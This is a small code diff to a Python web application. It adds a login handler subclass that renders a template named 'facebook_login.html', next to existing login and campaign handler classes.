@@ -43,6 +43,10 @@ class LoginHandler(RequestHandler):
     def get_login_page(self, args={}):
         return render_template('login.html')
 
+class FBLoginHandler(LoginHandler):
+    def get_login_page(self, args={}):
+        return render_template('facebook_login.html')
+
 class CampaignHandler(RequestHandler):
     def get(self, request=None, response=None):
         if "user" not in self.request.cookies.keys():
